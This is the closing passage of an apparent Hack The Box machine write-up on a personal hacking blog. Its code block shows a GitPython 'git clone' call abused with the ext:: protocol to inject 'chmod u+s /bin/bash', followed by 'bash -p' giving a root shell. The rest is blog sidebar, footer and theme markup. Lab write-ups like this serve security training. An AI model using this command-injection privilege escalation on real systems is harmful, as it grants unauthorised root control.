    finalize_process<span class="o">(</span>proc, <span class="nv">stderr</span><span class="o">=</span>stderr<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/util.py"</span>, line 419, <span class="k">in </span>finalize_process
    proc.wait<span class="o">(</span><span class="k">**</span>kwargs<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/cmd.py"</span>, line 559, <span class="k">in </span><span class="nb">wait
    </span>raise GitCommandError<span class="o">(</span>remove_password_if_present<span class="o">(</span>self.args<span class="o">)</span>, status, errstr<span class="o">)</span>
git.exc.GitCommandError: Cmd<span class="o">(</span><span class="s1">'git'</span><span class="o">)</span> failed due to: <span class="nb">exit </span>code<span class="o">(</span>128<span class="o">)</span>
  cmdline: git clone <span class="nt">-v</span> <span class="nt">-c</span> protocol.ext.allow<span class="o">=</span>always ext::sh <span class="nt">-c</span> <span class="nb">chmod</span>% u+s /bin/bash new_changes
  stderr: <span class="s1">'Cloning into '</span>new_changes<span class="s1">'...
chmod: missing operand after '</span>u+s<span class="s1">'
Try '</span><span class="nb">chmod</span> <span class="nt">--help</span><span class="s1">' for more information.
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'</span>
bash-5.1<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
<span class="nt">-rwsr-xr-x</span> 1 root root 1396520 Mar 14 11:31 /bin/bash
bash-5.1<span class="nv">$ </span>bash <span class="nt">-p</span>
bash-5.1# <span class="nb">whoami
</span>root
</code></pre></div></div>

  
</article>



  <hr class="dingbat related mb6" />






  
     


  <aside class="about related mt4 mb4" role="complementary">
    
    

<div class="author mt4">
  

  
    


<img
  
    src="https://placehold.it/128x128"
    srcset="https://placehold.it/128x128 1x,https://placehold.it/256x256 2x"
    
  
  alt="<firstname> <lastname>"
  class="avatar"
  
  width="120"
  height="120"
  loading="lazy"
/>

  

  
  
  <h2  class="page-title hr-bottom">
    About
  </h2>

  <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit,
sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>

<p>Open <code class="language-plaintext highlighter-rouge">_data/authors.yml</code> to edit this text.</p>


  <div class="sidebar-social">
    <span class="sr-only">Social:</span>
<ul>
  
    
      



  

  
  
  
  

  

  

  <li>
    <a href="https://twitter.com/<username>" title="Twitter" class="no-mark-external">
      <span class="icon-twitter"></span>
      <span class="sr-only">Twitter</span>
    </a>
  </li>


    
      



  

  
  
  
  

  

  

  <li>
    <a href="https://github.com/<username>" title="GitHub" class="no-mark-external">
      <span class="icon-github"></span>
      <span class="sr-only">GitHub</span>
    </a>
  </li>


    
  
</ul>

  </div>
</div>

  </aside>


  

  
    


  

  
    


  <aside class="other-projects related mb0" role="complementary">  <h2>Related Posts</h2>  <div class="columns">          <div class="column column-1-2">                  <article class="project-card">  <a href="/machines/axlle.html" class="no-hover no-print-link flip-project" tabindex="-1">    <div class="project-card-img aspect-ratio sixteen-nine flip-project-img">              <img      src="/assets/img/machines/axlle/logo.png"    alt="Axlle"      width="864"  height="486"  loading="lazy"/>          </div>  </a>  <h3 class="project-card-title flip-project-title">    <a href="/machines/axlle.html" class="flip-title">Axlle</a>  </h3>      <a class="fill-card no-hover" href="/machines/axlle.html" tabindex="-1"><span class="sr-only">Continue reading Axlle</span></a></article>              </div>          <div class="column column-1-2">                  <article class="project-card">  <a href="/certifications/oscp.html" class="no-hover no-print-link flip-project" tabindex="-1">    <div class="project-card-img aspect-ratio sixteen-nine flip-project-img">              <img      src="/assets/img/certifications/OSCP.png"    alt="OSCP"      width="864"  height="486"  loading="lazy"/>          </div>  </a>  <h3 class="project-card-title flip-project-title">    <a href="/certifications/oscp.html" class="flip-title">OSCP</a>  </h3>      <a class="fill-card no-hover" href="/certifications/oscp.html" tabindex="-1"><span class="sr-only">Continue reading OSCP</span></a></article>              </div>      </div></aside>

  

  
    


  <aside class="related mb4" role="complementary">  <h2 class="hr-bottom">Random Posts</h2>  <ul class="related-posts">          <li class="h4">  <a href="/whats-new-in-hydejack-9-1.html" class="flip-title"><span>What’s New in Hydejack 9.1?</span></a>  <time class="faded fine" datetime="2021-02-13T00:00:00-06:00">13 Feb 2021</time></li>          <li class="h4">  <a href="/example-content-iii.html" class="flip-title"><span>Example Content III</span></a>  <time class="faded fine" datetime="2018-06-01T00:00:00-05:00">01 Jun 2018</time></li>          <li class="h4">  <a href="/machine.html" class="flip-title"><span>Acute</span></a>  <time class="faded fine" datetime="2024-06-20T00:00:00-06:00">20 Jun 2024</time></li>      </ul></aside>

  

  
    

  


  
<footer class="content" role="contentinfo">
  <hr/>
  
    <p><small class="copyright">© 2021. All rights reserved.
</small></p>
  
  
    <nav class="legal"><small>
    
      
      <a class="heading flip-title" href="/LICENSE/">LICENSE</a>
      |
    
      
      <a class="heading flip-title" href="/NOTICE/">NOTICE</a>
      |
    
      
      <a class="heading flip-title" href="/CHANGELOG/">CHANGELOG</a>
      
    
    </small></nav>
  
  
  <hr class="sr-only"/>
</footer>


</main>

  <hy-drawer
  id="_drawer"
  class=""
  side="left"
  threshold="10"
  noscroll
  
>
  <header id="_sidebar" class="sidebar" role="banner">
    




<div class="sidebar-bg " style="background:url('/assets/img/guero.jpg') center/cover"></div>

    <div class="sidebar-sticky">
  <div class="sidebar-about">
    
      <a class="no-hover" href="/" tabindex="-1">
        <img src="/assets/img/logo.png" class="avatar" alt="Armando Villalobos" width="120" height="120" loading="lazy" />
      </a>
    
    <a class="sidebar-title" href="/"><h2 class="h1">Armando Villalobos</h2></a>
    
    
      <p class="">
        Vamos a darle al hacking

      </p>
    
  </div>

  <nav class="sidebar-nav heading" role="navigation">
    <span class="sr-only">Navigation:</span>
<ul>
  
  
  
    
      
    
  
    
      
        
        
        <li>
          
          <div class="list-wrapper">
            <a  href="/blog/example/" class="sidebar-nav-item"  >Examples</a>
            
          </div>
          
        </li>
      
    
  
    
      
        
        
        <li>
          
          <div class="list-wrapper">
            <a  href="/blog/hackthebox/" class="sidebar-nav-item"  >Machines</a>
            
          </div>
          
        </li>
      
    
  
    
      
        
        
        <li>
          
          <div class="list-wrapper">
            <a  href="/blog/certifications/" class="sidebar-nav-item"  >Certifications</a>
            
          </div>
          
        </li>
      
    
  
    
      
        
        
        <li>
          
          <div class="list-wrapper">
            <a  href="/resume/" class="sidebar-nav-item"  >Resume</a>
            
          </div>
          
        </li>
      
    
  
</ul>

  </nav>

  
  <div class="sidebar-social">
    <span class="sr-only">Social:</span>
<ul>
  
    
      



  

  
  
  
  

  

  

  <li>
    <a href="https://twitter.com/<username>" title="Twitter" class="no-mark-external">
      <span class="icon-twitter"></span>
      <span class="sr-only">Twitter</span>
    </a>
  </li>


    
      



  

  
  
  
  

  

  

  <li>
    <a href="https://github.com/<username>" title="GitHub" class="no-mark-external">
      <span class="icon-github"></span>
      <span class="sr-only">GitHub</span>
    </a>
  </li>


    
  
</ul>

  </div>
</div>
  </header>
</hy-drawer>
<hr class="sr-only" hidden />

</hy-push-state>


  <!--[if gt IE 10]><!---->
  <script nomodule>!function(){var t,n=document.createElement("script");!("noModule"in n)&&"onbeforeload"in n&&(t=!1,document.addEventListener("beforeload",function(e){if(e.target===n)t=!0;else if(!e.target.hasAttribute("nomodule")||!t)return;e.preventDefault()},!0),n.type="module",n.src=".",document.head.appendChild(n),n.remove())}();
</script>
  <script src="/assets/js/hydejack-9.1.6.js" type="module"></script>
  <script src="/assets/js/LEGACY-hydejack-9.1.6.js" nomodule defer></script>
  

  

  <script type="module">
    if ('serviceWorker' in navigator) {
      /**/
      navigator.serviceWorker.getRegistration()
        .then(r => r.unregister())
        .catch(() => {});
      /**/
    }
  </script>
<!--<![endif]-->
  



<div hidden>
  
  <h2 class="sr-only">Templates (for web app):</h2>

  <template id="_animation-template">
  <div class="animation-main fixed-top">
    <nav id="breadcrumbs" class="screen-only"><ul>
  
  
</ul></nav>
    <div class="content">
      <div class="page"></div>
    </div>
  </div>
</template>

  <template id="_loading-template">
  <div class="loading nav-btn fr">
    <span class="sr-only">Loading…</span>
    <span class="icon-cog"></span>
  </div>
</template>

  <template id="_error-template">
  <div class="page">
    <h1 class="page-title">Error</h1>
    
    
    <p class="lead">
      Sorry, an error occurred while loading <a class="this-link" href=""></a>.

    </p>
  </div>
</template>

  <template id="_permalink-template">
  <a href="#" class="permalink">
    <span class="sr-only">Permalink</span>
    <span class="content-hash"></span>
  </a>
</template>

  
  
    <template id="_dark-mode-template">
  <button id="_dark-mode" class="nav-btn no-hover" >
    <span class="sr-only">Dark Mode</span>
    <span class="icon-brightness-contrast"></span>
  </button>
</template>

  
  
    <template id="_search-template">
  <button id="_search" class="nav-btn no-hover">
    <label class="sr-only" for="_search-input">Search</label>
    <span class="icon-search"></span>
  </button>
  <div id="_search-box">
    <div class="nav-btn">
      <span class="icon-search"></span>
    </div>
    <input 
      id="_search-input"
      type="search"
      class="form-control form-control-lg nav-btn"
      placeholder="Build with JEKYLL_ENV=production to enable search."
    />
    <button type="reset" class="nav-btn no-hover">
      <span class="sr-only">Close</span>
      <span class="icon-cross"></span>
    </button>
  </div>
  <div id="_hits"></div>
</template>

  
</div>

</body>
</html>
